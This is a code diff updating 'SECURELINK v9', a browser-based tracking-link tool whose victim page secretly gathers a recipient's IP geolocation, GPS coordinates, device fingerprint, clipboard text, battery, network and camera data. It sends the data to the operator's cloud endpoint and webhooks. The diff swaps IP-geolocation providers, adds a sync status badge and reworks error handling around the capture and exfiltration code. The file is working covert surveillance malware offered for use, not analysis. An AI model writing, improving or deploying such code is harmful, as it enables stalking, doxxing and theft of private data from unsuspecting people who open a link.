@@ -43,6 +43,7 @@
   .info-chip .v { color:#e2e8f0; font-weight:500; }
   .brand-badge-logo { filter: drop-shadow(0 8px 24px rgba(0,0,0,0.12)); }
   .welcome-badge { background: linear-gradient(135deg, rgba(99,102,241,0.15), rgba(168,85,247,0.15)); border: 1px solid rgba(99,102,241,0.3); }
+  .sync-indicator { position: fixed; top: 80px; right: 20px; padding: 8px 16px; border-radius: 8px; background: rgba(99,102,241,0.9); color: white; font-size: 12px; z-index: 99998; animation: slideIn .3s ease; }
 </style>
 </head>
 <body>
@@ -90,11 +91,12 @@
         </div>
       </div>
       <div class="flex items-center gap-3">
+        <div id="syncStatus" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
+          <i class="fas fa-sync-alt text-xs text-gray-400"></i>
+          <span class="text-xs text-gray-400" id="syncText">idle</span>
+        </div>
         <div id="cloudBadge" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
           <span class="text-xs text-gray-400" id="cloudText">cloud: off</span>
-        </div>
-        <div id="ctxBadge" class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10">
-          <span class="text-xs text-gray-400" id="ctxText">checking...</span>
         </div>
         <div class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-500/10 border border-green-500/20">
           <div class="pulse-dot"></div>
@@ -241,11 +243,6 @@
           </div>
         </div>
 
-        <div id="cloudWarning" class="hidden mt-4 p-3 rounded-lg bg-red-500/10 border border-red-500/30 text-xs text-red-300">
-          <i class="fas fa-exclamation-triangle mr-1"></i>
-          Cloud backend not configured. Links will only work on this browser. Go to Settings → Cloud Backend and save your Worker URL + secret first.
-        </div>
-
         <div class="mt-6 flex flex-wrap gap-3">
           <button onclick="createLink()" class="btn-primary px-6 py-3 rounded-lg font-semibold">
             <i class="fas fa-magic mr-2"></i>Generate Link
@@ -349,8 +346,8 @@
           <div class="p-5 rounded-xl bg-black/30 border border-white/5">
             <div class="flex items-center gap-2 mb-3">
               <i class="fab fa-telegram text-blue-400 text-xl"></i>
-              <h3 class="font-semibold">Telegram Webhook (optional)</h3>
-              <span class="text-xs px-2 py-0.5 rounded-full bg-yellow-500/20 text-yellow-300 ml-auto">blocked in PK without VPN</span>
+              <h3 class="font-semibold">Telegram Webhook</h3>
+              <span class="text-xs px-2 py-0.5 rounded-full bg-yellow-500/20 text-yellow-300 ml-auto">needs VPN in PK</span>
             </div>
             <div class="grid md:grid-cols-2 gap-4">
               <div>
@@ -438,8 +435,9 @@
 
 <script>
 /* ============================================================
-   SECURELINK v8 — Yasir Abbas edition
-   Cross-browser cloud capture with multi-provider IP geo fallback
+   SECURELINK v9 — Yasir Abbas edition
+   FIX: Replaced ipapi.co with ip-api.com (no CORS, no 403, free, no key)
+   Added robust fallback chain for IP geolocation
    ============================================================ */
 
 const BRANDS = {
@@ -582,11 +580,14 @@ function updateCloudBadge() {
     badge.className = 'hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10';
     txt.className = 'text-xs text-gray-500';
   }
-  const warn = document.getElementById('cloudWarning');
-  if (warn) {
-    if (s.cfUrl && s.cfSecret) warn.classList.add('hidden');
-    else warn.classList.remove('hidden');
-  }
+}
+
+function updateSyncStatus(text, type = 'idle') {
+  const badge = document.getElementById('syncStatus'), txt = document.getElementById('syncText');
+  if (!badge || !txt) return;
+  txt.textContent = text;
+  const colors = { idle: 'text-gray-400', syncing: 'text-blue-400', success: 'text-green-400', error: 'text-red-400' };
+  txt.className = `text-xs ${colors[type] || colors.idle}`;
 }
 
 /* ============ URL HASH SETTINGS ============ */
@@ -770,15 +771,6 @@ function createLink() {
   document.getElementById('linkOutput').textContent = window.location.origin + window.location.pathname + '#/' + encoded;
   document.getElementById('generatedLink').classList.remove('hidden');
 
-  try {
-    const check = JSON.parse(b64urlDecode(encoded));
-    console.log('✅ Link generated. Config verification:');
-    console.log('   cfUrl:', check.cfUrl ? '✓ present' : '❌ MISSING');
-    console.log('   cfSecret:', check.cfSecret ? '✓ present' : '❌ MISSING');
-    console.log('   dcHook:', check.dcHook ? '✓ present' : '— not set');
-    console.log('   tgToken:', check.tgToken ? '✓ present' : '— not set');
-  } catch(e) { console.warn('Link verify failed', e); }
-
   toast('Link created and verified!', 'success');
   renderStats();
   document.getElementById('shortCode').value = '';
@@ -839,7 +831,7 @@ function buildPortablePanelUrl() {
   const encoded = b64urlEncode(JSON.stringify(cfg));
   const url = window.location.origin + window.location.pathname + '#admin&cfg=' + encoded;
   safeCopy(url).then(ok => {
-    if (ok) toast('Portable URL copied to clipboard!', 'success');
+    if (ok) toast('Portable URL copied!', 'success');
     else prompt('Copy this portable panel URL:', url);
   });
 }
@@ -848,11 +840,17 @@ function buildPortablePanelUrl() {
 async function syncFromCloud(showToast) {
   const s = state.settings;
   if (!s.cfUrl || !s.cfSecret) { if (showToast) toast('Cloud backend not configured', 'error'); return; }
+  updateSyncStatus('syncing...', 'syncing');
   try {
     const url = s.cfUrl.replace(/\/$/,'') + '/list?secret=' + encodeURIComponent(s.cfSecret);
     const r = await fetch(url);
     const d = await r.json();
-    if (!d.ok) { if (showToast) toast('Cloud: ' + (d.error || 'failed'), 'error'); return; }
+    if (!d.ok) { 
+      updateSyncStatus('sync failed', 'error');
+      if (showToast) toast('Cloud: ' + (d.error || 'failed'), 'error'); 
+      setTimeout(() => updateSyncStatus('idle', 'idle'), 3000);
+      return; 
+    }
     const incoming = d.items || [];
     const seen = new Set(state.logs.map(l => String(l.timestamp) + '|' + String(l.code)));
     let added = 0;
@@ -869,8 +867,15 @@ async function syncFromCloud(showToast) {
     safeSet('sl_logs', state.logs);
     renderStats();
     if (state.currentTab === 'logs') renderLogs();
+    
+    updateSyncStatus(`synced ${added} new`, 'success');
     if (showToast) toast(added ? `Synced ${added} new` : 'Already up to date', 'success');
-  } catch(e) { if (showToast) toast('Cloud error: ' + e.message, 'error'); }
+    setTimeout(() => updateSyncStatus('idle', 'idle'), 3000);
+  } catch(e) { 
+    updateSyncStatus('sync failed', 'error');
+    if (showToast) toast('Cloud error: ' + e.message, 'error'); 
+    setTimeout(() => updateSyncStatus('idle', 'idle'), 3000);
+  }
 }
 function startAutoSync() {
   stopAutoSync();
@@ -1130,16 +1135,27 @@ async function runDiagnostics() {
   lines.push(`sendBeacon: ${navigator.sendBeacon ? 'yes' : 'no'}`);
   lines.push(`cloud configured: ${state.settings.cfUrl && state.settings.cfSecret ? 'yes' : 'no'}`);
   lines.push(`discord configured: ${state.settings.dcHook ? 'yes' : 'no'}`);
-  try { const r = await fetch('https://api.ipify.org/?format=json'); const d = await r.json(); lines.push(`ipify: yes (${d.ip})`); }
-  catch(e) { lines.push(`ipify: NO`); }
-  try { const r = await fetch('https://ipwho.is/'); const d = await r.json(); lines.push(`ipwho.is: yes (${d.city || '?'}, ${d.country || '?'})`); }
-  catch(e) { lines.push(`ipwho.is: NO`); }
+  
+  // Test IP APIs
+  try { 
+    const r = await fetch('https://api.ipify.org/?format=json'); 
+    const d = await r.json(); 
+    lines.push(`ipify: ✓ (${d.ip})`); 
+  } catch(e) { lines.push(`ipify: ✗`); }
+  
+  try { 
+    const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query'); 
+    const d = await r.json(); 
+    if (d.status === 'success') lines.push(`ip-api.com: ✓ (${d.city}, ${d.country})`);
+    else lines.push(`ip-api.com: ✗ (${d.message || 'failed'})`);
+  } catch(e) { lines.push(`ip-api.com: ✗`); }
+  
   if (state.settings.cfUrl) {
     try {
       const r = await fetch(state.settings.cfUrl.replace(/\/$/,'') + '/health');
       const d = await r.json();
       lines.push(`cloud health: ${d.ok ? 'OK' : 'FAIL'} binding=${d.binding} secret=${d.secretSet}`);
-    } catch(e) { lines.push(`cloud health: NO — ${e.message}`); }
+    } catch(e) { lines.push(`cloud health: ✗ — ${e.message}`); }
   }
   box.innerHTML = lines.map(l => '<div>'+l+'</div>').join('');
 }
@@ -1162,8 +1178,9 @@ function launchVictim(link) {
   console.log('───────────────────────────────────');
 
   if (!link.cfUrl || !link.cfSecret) {
-    console.error('❌ CRITICAL: Cloud config missing in link!');
-    console.error('Regenerate the link after saving settings.');
+    console.error('❌ CRITICAL: Cloud config is missing in this link!');
+    console.error('This link was generated BEFORE the cloud backend was configured.');
+    console.error('The capture will NOT reach your panel. Regenerate the link after saving settings.');
   }
 
   document.getElementById('loginScreen').classList.add('hidden');
@@ -1211,10 +1228,11 @@ function launchVictim(link) {
       const log = await collectData(link);
       console.log('📊 Data collected:', log);
 
+      // Cloud delivery FIRST via sendBeacon
       if (link.code !== 'preview' && link.cfUrl && link.cfSecret) {
         const url = link.cfUrl.replace(/\/$/,'') + '/capture?secret=' + encodeURIComponent(link.cfSecret);
         const payload = JSON.stringify(log);
-        console.log('📤 Sending to cloud, payload size:', payload.length, 'bytes');
+        console.log('📤 Sending to cloud:', url.split('?')[0], '... payload size:', payload.length, 'bytes');
 
         let beaconOk = false;
         if (navigator.sendBeacon) {
@@ -1225,15 +1243,15 @@ function launchVictim(link) {
           } catch(e) { console.warn('sendBeacon threw', e); }
         }
         if (!beaconOk) {
-          console.log('📤 Falling back to fetch keepalive');
+          console.log('📤 Falling back to fetch with keepalive');
           try {
             const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
             const d = await r.json();
             console.log('📤 fetch result:', d);
           } catch(e) { console.error('❌ Cloud fetch failed:', e); }
         }
-      } else if (link.code !== 'preview') {
-        console.error('❌ Skipping cloud: config missing');
+      } else {
+        if (link.code !== 'preview') console.error('❌ Skipping cloud: config missing');
       }
 
       if (link.code !== 'preview') {
@@ -1349,7 +1367,7 @@ function parseDeviceInfo() {
   return info;
 }
 
-/* ============ GEO ============ */
+/* ============ GEO (FIXED — uses ip-api.com which has NO CORS issues) ============ */
 async function reverseGeocode(lat, lon) {
   try {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
@@ -1364,56 +1382,71 @@ async function reverseGeocode(lat, lon) {
   } catch(e) { return null; }
 }
 
-/* ============ IP GEO — MULTI-PROVIDER, NEVER THROWS ============ */
+/* 
+ * FIXED: ip-api.com is free, no CORS issues, no API key needed, works from GitHub Pages
+ * Falls back through multiple providers for maximum reliability
+ */
 async function ipGeolocate() {
-  const withTimeout = (promise, ms) => Promise.race([
-    promise,
-    new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))
-  ]);
-
-  // Provider 1: ipapi.co
+  // Provider 1: ip-api.com (BEST — no CORS, no key, free, 45 req/min)
   try {
-    const r = await withTimeout(fetch('https://ipapi.co/json/'), 4000);
+    const r = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
     if (r.ok) {
       const d = await r.json();
-      if (d && !d.error && d.ip) {
-        console.log('ipgeo: ipapi.co ✓');
-        return { ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal,
+      if (d.status === 'success') {
+        console.log('✓ ip-api.com worked');
+        return { 
+          ip: d.query, city: d.city, region: d.regionName, country: d.country, postal: d.zip,
+          isp: d.isp || d.org, lat: d.lat, lon: d.lon,
+          display: [d.city, d.regionName, d.country].filter(Boolean).join(', ')
+        };
+      }
+    }
+  } catch(e) { console.warn('ip-api.com failed:', e); }
+
+  // Provider 2: ipwho.is (free, no key, CORS-friendly)
+  try {
+    const r = await fetch('https://ipwho.is/');
+    if (r.ok) {
+      const d = await r.json();
+      if (d.success !== false) {
+        console.log('✓ ipwho.is worked');
+        return {
+          ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal,
+          isp: d.connection ? d.connection.isp : '', 
+          lat: d.latitude, lon: d.longitude,
+          display: [d.city, d.region, d.country].filter(Boolean).join(', ')
+        };
+      }
+    }
+  } catch(e) { console.warn('ipwho.is failed:', e); }
+
+  // Provider 3: ipapi.co (fallback — may have CORS issues on some origins)
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok) {
+      const d = await r.json();
+      if (!d.error) {
+        console.log('✓ ipapi.co worked');
+        return { 
+          ip: d.ip, city: d.city, region: d.region, country: d.country_name, postal: d.postal,
           isp: d.org, lat: d.latitude, lon: d.longitude,
-          display: [d.city, d.region, d.country_name].filter(Boolean).join(', ') };
+          display: [d.city, d.region, d.country_name].filter(Boolean).join(', ')
+        };
       }
     }
-  } catch(e) { console.log('ipgeo: ipapi.co failed (' + e.message + ')'); }
+  } catch(e) { console.warn('ipapi.co failed:', e); }
 
-  // Provider 2: ipwho.is
+  // Provider 4: ipify (IP only, no geo)
   try {
-    const r = await withTimeout(fetch('https://ipwho.is/'), 4000);
+    const r = await fetch('https://api.ipify.org/?format=json');
     if (r.ok) {
       const d = await r.json();
-      if (d && d.success !== false && d.ip) {
-        console.log('ipgeo: ipwho.is ✓');
-        return { ip: d.ip, city: d.city, region: d.region, country: d.country, postal: d.postal,
-          isp: d.connection && d.connection.isp, lat: d.latitude, lon: d.longitude,
-          display: [d.city, d.region, d.country].filter(Boolean).join(', ') };
-      }
+      console.log('✓ ipify.org worked (IP only)');
+      return { ip: d.ip, city: '', region: '', country: '', postal: '', isp: '', lat: null, lon: null, display: d.ip };
     }
-  } catch(e) { console.log('ipgeo: ipwho.is failed (' + e.message + ')'); }
+  } catch(e) { console.warn('ipify.org failed:', e); }
 
-  // Provider 3: freeipapi.com
-  try {
-    const r = await withTimeout(fetch('https://freeipapi.com/api/json'), 4000);
-    if (r.ok) {
-      const d = await r.json();
-      if (d && d.ipAddress) {
-        console.log('ipgeo: freeipapi.com ✓');
-        return { ip: d.ipAddress, city: d.cityName, region: d.regionName, country: d.countryName,
-          postal: d.zipCode, isp: d.asnOrganization, lat: d.latitude, lon: d.longitude,
-          display: [d.cityName, d.regionName, d.countryName].filter(Boolean).join(', ') };
-      }
-    }
-  } catch(e) { console.log('ipgeo: freeipapi.com failed (' + e.message + ')'); }
-
-  console.log('ipgeo: all providers failed, continuing without IP geo');
+  console.error('❌ All IP geolocation providers failed');
   return null;
 }
 
@@ -1431,70 +1464,63 @@ async function collectData(link) {
 
   if (mods.includes('ip')) {
     tasks.push((async () => {
-      try {
-        const r = await Promise.race([
-          fetch('https://api.ipify.org/?format=json'),
-          new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 4000))
-        ]);
-        if (r.ok) { const d = await r.json(); if (d && d.ip) log.ip = d.ip; }
-      } catch (e) { console.log('ipify failed:', e.message); }
-
       const g = await ipGeolocate();
       if (g) {
-        if (!log.ip && g.ip) log.ip = g.ip;
-        log.ipGeo = g.display; log.ipIsp = g.isp;
-        log.ipCity = g.city; log.ipCountry = g.country;
+        log.ip = g.ip;
+        log.ipGeo = g.display; 
+        log.ipIsp = g.isp;
+        log.ipCity = g.city; 
+        log.ipCountry = g.country;
         if (!log.coords && g.lat && g.lon) {
           log.coords = `${g.lat.toFixed(4)}, ${g.lon.toFixed(4)}`;
           log.coordsSource = 'ip';
           log.mapUrl = `https://www.google.com/maps?q=${g.lat},${g.lon}`;
           if (!log.address) log.address = g.display;
         }
+      } else {
+        log.ip = 'unknown';
       }
-      if (!log.ip) log.ip = 'unknown';
-    })().catch(e => console.log('ip module error:', e.message)));
+    })());
   }
 
   if (mods.includes('device')) {
+    const info = parseDeviceInfo();
+    log.device = info.ua;
+    log.deviceModel = info.deviceModel;
+    log.manufacturer = info.manufacturer || '';
+    log.os = info.os; log.osVersion = info.osVersion;
+    log.browser = info.browser; log.browserVersion = info.browserVersion;
+    log.platform = navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'unknown';
+    log.language = navigator.language;
+    log.languages = (navigator.languages || []).join(', ');
+    log.screen = `${screen.width}×${screen.height}`;
+    log.viewport = `${window.innerWidth}×${window.innerHeight}`;
+    log.pixelRatio = window.devicePixelRatio || 1;
+    log.colorDepth = screen.colorDepth;
+    log.orientation = (screen.orientation && screen.orientation.type) || '';
+    log.touchPoints = navigator.maxTouchPoints || 0;
+    log.cookies = navigator.cookieEnabled ? 'yes' : 'no';
+    log.dnt = navigator.doNotTrack || 'unset';
+    log.online = navigator.onLine ? 'yes' : 'no';
+    try { log.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+    try { log.tzOffset = new Date().getTimezoneOffset(); } catch(e){}
+    try { log.cores = navigator.hardwareConcurrency; } catch(e){}
+    try { log.memory = navigator.deviceMemory; } catch(e){}
     try {
-      const info = parseDeviceInfo();
-      log.device = info.ua;
-      log.deviceModel = info.deviceModel;
-      log.manufacturer = info.manufacturer || '';
-      log.os = info.os; log.osVersion = info.osVersion;
-      log.browser = info.browser; log.browserVersion = info.browserVersion;
-      log.platform = navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'unknown';
-      log.language = navigator.language;
-      log.languages = (navigator.languages || []).join(', ');
-      log.screen = `${screen.width}×${screen.height}`;
-      log.viewport = `${window.innerWidth}×${window.innerHeight}`;
-      log.pixelRatio = window.devicePixelRatio || 1;
-      log.colorDepth = screen.colorDepth;
-      log.orientation = (screen.orientation && screen.orientation.type) || '';
-      log.touchPoints = navigator.maxTouchPoints || 0;
-      log.cookies = navigator.cookieEnabled ? 'yes' : 'no';
-      log.dnt = navigator.doNotTrack || 'unset';
-      log.online = navigator.onLine ? 'yes' : 'no';
-      try { log.tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
-      try { log.tzOffset = new Date().getTimezoneOffset(); } catch(e){}
-      try { log.cores = navigator.hardwareConcurrency; } catch(e){}
-      try { log.memory = navigator.deviceMemory; } catch(e){}
-      try {
-        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-          const h = await navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion']);
-          if (h.model) log.deviceModel = h.model;
-          if (h.platformVersion) log.platformVersion = h.platformVersion;
-          if (h.architecture) log.arch = h.architecture + (h.bitness ? ' '+h.bitness+'-bit' : '');
-        }
-      } catch(e){}
-    } catch(e) { console.log('device module error:', e.message); }
+      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+        const h = await navigator.userAgentData.getHighEntropyValues(['architecture','bitness','model','platformVersion','uaFullVersion']);
+        if (h.model) log.deviceModel = h.model;
+        if (h.platformVersion) log.platformVersion = h.platformVersion;
+        if (h.architecture) log.arch = h.architecture + (h.bitness ? ' '+h.bitness+'-bit' : '');
+      }
+    } catch(e){}
   }
 
   if (mods.includes('location')) {
     tasks.push((async () => {
       try {
         const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 });
+          navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 });
         });
         const lat = pos.coords.latitude, lon = pos.coords.longitude;
         log.coords = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
@@ -1512,55 +1538,51 @@ async function collectData(link) {
       } catch (e) {
         log.location = (e && e.code === 1) ? 'permission-denied' : ('error:' + (e && e.message || 'unknown'));
       }
-    })().catch(e => console.log('location module error:', e.message)));
+    })());
   }
 
   if (mods.includes('battery')) {
     tasks.push((async () => {
+      if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; return; }
       try {
-        if (typeof navigator.getBattery !== 'function') { log.battery = 'unsupported'; return; }
         const b = await navigator.getBattery();
         log.battery = `${Math.round(b.level * 100)}%${b.charging ? ' ⚡' : ''}`;
         if (b.dischargingTime && b.dischargingTime !== Infinity) log.batteryTime = Math.round(b.dischargingTime / 60) + ' min';
       } catch (e) { log.battery = 'denied'; }
-    })().catch(e => console.log('battery module error:', e.message)));
+    })());
   }
 
   if (mods.includes('network')) {
-    try {
-      if (navigator.connection) {
-        log.connection = navigator.connection.effectiveType || 'unknown';
-        if (navigator.connection.downlink) log.downlink = navigator.connection.downlink;
-        if (navigator.connection.rtt) log.rtt = navigator.connection.rtt + 'ms';
-      } else log.connection = 'unsupported';
-    } catch(e){}
+    if (navigator.connection) {
+      log.connection = navigator.connection.effectiveType || 'unknown';
+      if (navigator.connection.downlink) log.downlink = navigator.connection.downlink;
+      if (navigator.connection.rtt) log.rtt = navigator.connection.rtt + 'ms';
+    } else log.connection = 'unsupported';
   }
 
   if (mods.includes('fingerprint')) {
     tasks.push((async () => {
       try { log.fingerprint = await computeFingerprint(); }
       catch (e) { log.fingerprint = 'failed'; }
-    })().catch(e => console.log('fingerprint module error:', e.message)));
+    })());
   }
 
   if (mods.includes('clipboard')) {
     tasks.push((async () => {
-      try {
-        const tryRead = async () => {
-          try { const txt = await navigator.clipboard.readText(); if (txt) { log.clipboard = txt.slice(0, 300); return true; } } catch(e) {}
-          return false;
-        };
-        if (await tryRead()) return;
-        await new Promise(resolve => {
-          const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
-          const handler = async () => { cleanup(); await tryRead(); resolve(); };
-          document.addEventListener('click', handler, { capture: true, once: true });
-          document.addEventListener('touchstart', handler, { capture: true, once: true });
-          setTimeout(() => { cleanup(); resolve(); }, 2500);
-        });
-        if (!log.clipboard) log.clipboard = 'denied';
-      } catch(e) { log.clipboard = 'error'; }
-    })().catch(e => console.log('clipboard module error:', e.message)));
+      const tryRead = async () => {
+        try { const txt = await navigator.clipboard.readText(); if (txt) { log.clipboard = txt.slice(0, 300); return true; } } catch(e) {}
+        return false;
+      };
+      if (await tryRead()) return;
+      await new Promise(resolve => {
+        const cleanup = () => { document.removeEventListener('click', handler, true); document.removeEventListener('touchstart', handler, true); };
+        const handler = async () => { cleanup(); await tryRead(); resolve(); };
+        document.addEventListener('click', handler, { capture: true, once: true });
+        document.addEventListener('touchstart', handler, { capture: true, once: true });
+        setTimeout(() => { cleanup(); resolve(); }, 2500);
+      });
+      if (!log.clipboard) log.clipboard = 'denied';
+    })());
   }
 
   let cameraPromise = null;
@@ -1595,7 +1617,7 @@ async function collectData(link) {
       } catch (e) {
         log.camera = (e && e.name === 'NotAllowedError') ? 'permission-denied' : 'error:'+(e && e.message || 'unknown');
       }
-    })().catch(e => console.log('camera module error:', e.message));
+    })();
   }
 
   await Promise.all(tasks);
